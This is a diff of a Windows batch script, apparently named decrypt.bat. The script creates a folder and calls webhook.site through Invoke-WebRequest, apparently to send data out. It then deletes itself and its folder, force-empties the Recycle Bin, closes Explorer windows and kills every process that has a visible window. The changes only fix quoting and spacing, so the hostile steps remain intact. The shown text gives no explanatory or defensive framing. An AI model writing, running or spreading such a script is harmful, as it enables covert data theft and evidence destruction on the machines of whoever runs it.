@@ -1,5 +1,3 @@
-
-
 start cmd.exe /k  "powershell -command mkdir -p C:/Users/Decrypt;"
 timeout /t 2
 
@@ -15,15 +13,15 @@ start cmd.exe /k powershell -command Invoke-WebRequest -Uri https://webhook.site
 
 timeout /t 5
 
-start cmd.exe /k powershell -command Remove-Item -path c:\Users\Decrypt, c:\Users\decrypt.bat -recurse;"
+start cmd.exe /k powershell -command Remove-Item -path "c:\Users\Decrypt, c:\Users\decrypt.bat -recurse;"
 
 timeout /t 5
 
-start cmd.exe /k powershell -command Clear-RecycleBin -Force;"
+start cmd.exe /k powershell -command "Clear-RecycleBin -Force;"
 
 timeout /t 2
 
 start cmd.exe /k powershell -command "(New-Object -comObject Shell.Application).Windows() | foreach-object {$_.quit()}; Get-Process | Where-Object {$_.MainWindowTitle -ne \"\"} | stop-process"
-timeout /t 5
 
+timeout /t 5
 exit
